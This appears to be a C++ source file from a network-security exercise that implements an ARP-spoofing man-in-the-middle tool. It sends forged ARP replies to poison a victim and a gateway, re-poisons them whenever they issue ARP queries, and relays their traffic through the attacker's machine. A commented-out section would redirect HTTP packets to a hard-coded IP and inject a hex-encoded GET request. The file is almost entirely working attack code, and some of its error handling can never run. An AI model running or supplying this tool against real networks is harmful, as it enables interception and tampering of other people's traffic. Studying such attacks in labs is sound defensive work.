#pragma once
#include "pch.h"
int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_mac, u_int8_t *sender_mac, u_int8_t *sender_ip, u_int8_t *target_mac, u_int8_t *target_ip, int type)
{
    EthArpPacket packet;

    copy_mac(dest_mac, packet.eth_.dmac_);
    copy_mac(source_mac, packet.eth_.smac_);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = 6;
    packet.arp_.pln_ = 4;
    if (type == 0)
    {
        packet.arp_.op_ = htons(ArpHdr::Request);
    }
    else if (type == 1)
    {
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    else
    {
        printf("case 0 is sending request, case 1 is sending reply\n");
        return -1;
    }
    copy_mac(sender_mac, packet.arp_.smac_);
    copy_ip(sender_ip, packet.arp_.sip);
    copy_mac(target_mac, packet.arp_.tmac_);
    copy_ip(target_ip, packet.arp_.tip);
    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return -1;
    }
    return 0;
}

int reply(const char *dev, pcap_t *pcap, u_int8_t *ip, u_int8_t *mac, u_int8_t *mymac)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    int res = pcap_next_ex(pcap, &header, &packet);
    if (res != 1)
    {
        printf("error!\n");
        return -1;
    }
    EthArpPacket *arppkt;
    arppkt = (EthArpPacket *)packet;
    if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && if_same_mac(arppkt->arp_.tmac_, mymac) && if_same_ip(arppkt->arp_.sip, ip))
    {
        print_mac(arppkt->arp_.smac_);
    }
    copy_mac(arppkt->arp_.smac_, mac);
    return 0;
}

int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *victim_mac, u_int8_t *gate_mac, u_int8_t *victim_ip, u_int8_t *gate_ip)
{
    char modify[478] = {0x47, 0x45, 0x54, 0x20, 0x2f, 0x20, 0x48, 0x54, 0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a, 0x48, 0x6f, 0x73, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x73, 0x74, 0x2e, 0x67, 0x69, 0x6c, 0x67, 0x69, 0x6c, 0x2e, 0x6e, 0x65, 0x74, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x6b, 0x65, 0x65, 0x70, 0x2d, 0x61, 0x6c, 0x69, 0x76, 0x65, 0x0d, 0x0a, 0x43, 0x61, 0x63, 0x68, 0x65, 0x2d, 0x43, 0x6f, 0x6e, 0x74, 0x72, 0x6f, 0x6c, 0x3a, 0x20, 0x6d, 0x61, 0x78, 0x2d, 0x61, 0x67, 0x65, 0x3d, 0x30, 0x0d, 0x0a, 0x55, 0x70, 0x67, 0x72, 0x61, 0x64, 0x65, 0x2d, 0x49, 0x6e, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x2d, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x73, 0x3a, 0x20, 0x31, 0x0d, 0x0a, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x31, 0x30, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x36, 0x34, 0x3b, 0x20, 0x78, 0x36, 0x34, 0x29, 0x20, 0x41, 0x70, 0x70, 0x6c, 0x65, 0x57, 0x65, 0x62, 0x4b, 0x69, 0x74, 0x2f, 0x35, 0x33, 0x37, 0x2e, 0x33, 0x36, 0x20, 0x28, 0x4b, 0x48, 0x54, 0x4d, 0x4c, 0x2c, 0x20, 0x6c, 0x69, 0x6b, 0x65, 0x20, 0x47, 0x65, 0x63, 0x6b, 0x6f, 0x29, 0x20, 0x43, 0x68, 0x72, 0x6f, 0x6d, 0x65, 0x2f, 0x31, 0x30, 0x33, 0x2e, 0x30, 0x2e, 0x30, 0x2e, 0x30, 0x20, 0x53, 0x61, 0x66, 0x61, 0x72, 0x69, 0x2f, 0x35, 0x33, 0x37, 0x2e, 0x33, 0x36, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x3a, 0x20, 0x74, 0x65, 0x78, 0x74, 0x2f, 0x68, 0x74, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x68, 0x74, 0x6d, 0x6c, 0x2b, 0x78, 0x6d, 0x6c, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x78, 0x6d, 0x6c, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x69, 0x6d, 0x61, 0x67, 0x65, 0x2f, 0x61, 0x76, 0x69, 0x66, 0x2c, 0x69, 0x6d, 0x61, 0x67, 0x65, 0x2f, 0x77, 0x65, 0x62, 0x70, 0x2c, 0x69, 0x6d, 0x61, 0x67, 0x65, 0x2f, 0x61, 0x70, 0x6e, 0x67, 0x2c, 0x2a, 0x2f, 0x2a, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x2c, 0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x73, 0x69, 0x67, 0x6e, 0x65, 0x64, 0x2d, 0x65, 0x78, 0x63, 0x68, 0x61, 0x6e, 0x67, 0x65, 0x3b, 0x76, 0x3d, 0x62, 0x33, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x45, 0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x67, 0x7a, 0x69, 0x70, 0x2c, 0x20, 0x64, 0x65, 0x66, 0x6c, 0x61, 0x74, 0x65, 0x0d, 0x0a, 0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x4c, 0x61, 0x6e, 0x67, 0x75, 0x61, 0x67, 0x65, 0x3a, 0x20, 0x6b, 0x6f, 0x2d, 0x4b, 0x52, 0x2c, 0x6b, 0x6f, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x39, 0x2c, 0x65, 0x6e, 0x2d, 0x55, 0x53, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x38, 0x2c, 0x65, 0x6e, 0x3b, 0x71, 0x3d, 0x30, 0x2e, 0x37, 0x0d, 0x0a, 0x0d, 0x0a};
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        EthArpPacket *pkt;
        pkt = (EthArpPacket *)packet;
        ip_hdr *ippkt = (ip_hdr *)(packet + 14);
        tcp_hdr *tcppkt = (tcp_hdr *)(packet + 14 + 4 * ippkt->ip_hl);
        u_char *payload = (u_char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset);
        u_int8_t infect_destip[4] = {179, 116, 97, 147};
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, gate_mac)) && (if_same_ip(pkt->arp_.tip, victim_ip)))
        {
            printf("where is victim?\n");
            request(dev, pcap, gate_mac, attacker_mac, attacker_mac, victim_ip, gate_mac, gate_ip, 1);
            continue;
        }

        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, victim_mac)) && (if_same_ip(pkt->arp_.tip, gate_ip)))
        {
            printf("where is gate?\n");
            request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
            continue;
        }

        if (if_same_mac(pkt->eth_.smac_, victim_mac))
        {
            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
            {
                copy_mac(gate_mac, ((EthArpPacket *)packet)->eth_.dmac_);
                copy_mac(attacker_mac, ((EthArpPacket *)packet)->eth_.smac_);
                // if (pkt->eth_.type_ == htons(EthHdr::Ip4) && ippkt->ip_protocol == 6)
                // {
                //     if (check_http(payload))
                //     {
                //         printf("http!\n");
                //         copy_ip(infect_destip, ippkt->ip_dest);
                //         fix_len(&((ip_hdr *)(packet + 14))->ip_len, htons(0x0205));
                //         copy_payload(modify, (char *)(packet + 14 + 4 * ippkt->ip_hl + 4 * tcppkt->tcp_offset));
                //     }
                // }
                int res = pcap_sendpacket(pcap, (u_char *)packet, header->len);
                continue;
                if (res != 0)
                {
                    printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                    continue;
                }
            }
        }
        else if (if_same_mac(pkt->eth_.smac_, gate_mac))
        {
            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
            {

                copy_mac(victim_mac, pkt->eth_.dmac_);
                copy_mac(attacker_mac, pkt->eth_.smac_);
                int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                continue;
                if (res != 0)
                {
                    printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                    continue;
                }
            }
        }
    }
    return 0;
}
